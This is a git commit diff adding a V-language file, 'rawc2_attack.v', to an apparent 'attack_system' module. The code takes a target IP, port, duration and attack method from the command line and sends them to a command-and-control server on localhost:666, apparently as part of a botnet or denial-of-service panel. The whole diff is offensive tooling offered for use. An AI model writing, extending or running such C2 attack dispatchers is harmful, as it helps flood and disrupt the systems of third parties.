54e9f3c3f4b0749c1ae15b5613b32de76cacea50
Jebize <73313376+jazuki1337@users.noreply.github.com>
2022-01-17 10:26:08 -0600

    Update rawc2

--- attack_system/rawc2_attack.v
+++ attack_system/rawc2_attack.v
@@ -1,1 +1,23 @@
 module attack_system
+import net
+import io
+import os
+import net
+
+struct Attackc2 {
+    pub mut:
+        ips string
+        ports string
+        times string
+        methods string
+}
+
+fn rawattack() {
+  ip := Attackc2{ ips: os.args[1]}
+  port := Attackc2{ ports: os.args[2]}
+  time := Attackc2{ times: os.args[3]}
+  method := Attackc2{ methods: os.args[4]}
+  mut conn := net.dial_tcp("localhost:666") or {panic("C2 IS DOWN!!!")} 
+  conn.write_string("$ip.ips $port.ports $time.times $method.methods") or {0}
+  println("sent!!!")
+}   
